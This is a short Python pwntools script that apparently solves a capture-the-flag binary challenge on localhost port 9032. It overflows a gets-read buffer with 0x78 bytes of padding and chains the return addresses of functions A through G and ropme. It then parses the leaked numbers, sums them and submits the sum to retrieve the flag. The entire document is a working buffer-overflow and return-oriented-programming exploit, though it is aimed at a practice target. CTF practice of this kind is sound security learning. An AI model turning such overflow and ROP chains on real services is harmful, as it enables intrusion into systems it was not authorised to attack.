from pwn import *
import re

# Connect to nc running on port 9032
r = remote('localhost', 9032)

r.recv()
r.recv()

# Some random number, doesn't really matter
r.sendline(b"1")
r.recv()

A_address = 0x0804129D
B_address = 0x080412CF
C_address = 0x08041301
D_address = 0x08041333
E_address = 0x08041365
F_address = 0x08041397
G_address = 0x080413C9
ropme_address = 0x0804150B

# Server uses gets so we can overflow buffer
# Build payload
payload = b'a' * 0x78 # Fill buffer
payload += p32(A_address)
payload += p32(B_address)
payload += p32(C_address)
payload += p32(D_address)
payload += p32(E_address)
payload += p32(F_address)
payload += p32(G_address)
payload += p32(ropme_address)

r.sendline(payload)
r.recv()

# Get all numbers from functions
response = r.recv().decode()
numbers = re.findall(r'\+([^\)]*)\)', response)

# Sum all numbers
sum_numbers = sum(int(i) for i in numbers)
r.sendline(b"1")

# Send sum
r.sendline(str(sum_numbers).encode())

flag = r.recv().decode().split()[-1]
print("Flag is:", flag)